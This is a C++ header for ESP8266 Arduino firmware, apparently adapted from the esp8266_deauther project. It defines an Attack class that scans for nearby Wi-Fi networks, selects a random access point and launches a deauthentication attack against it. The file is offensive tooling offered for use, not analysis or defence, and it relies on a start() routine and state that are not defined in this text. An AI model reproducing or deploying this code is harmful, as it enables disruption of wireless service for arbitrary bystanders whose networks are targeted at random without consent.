// source: https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/Attack.h
// i implemented it in my own code, here is the credit for them

#pragma once

#include "Arduino.h"
#include <ESP8266WiFi.h>

extern uint8_t  wifi_channel;
extern uint8_t  broadcast[6];
extern uint32_t currentTime;

class Attack {
public:
    void selectRandomAP() {
        int apCount = WiFi.scanNetworks();

        if (apCount > 0) {
            int randomIndex = random(apCount);

            randomAP = WiFi.SSID(randomIndex);

            Serial.print("Selected random AP: ");
            Serial.println(randomAP);
        } else {
            Serial.println("No access points found.");
        }
    }

    void startRandomDeauth() {
        if (randomAP.length() > 0) {
            Serial.println("Starting deauthentication attack on the selected AP...");
            if (!running) {
                start(true, false, false, false, true, 0);
            } else {
                Serial.println("Attack is already running.");
            }

        } else {
            Serial.println("No access point selected. Use selectRandomAP() first.");
        }
    }

private:
    String randomAP;
};

extern Attack deauthAttack;
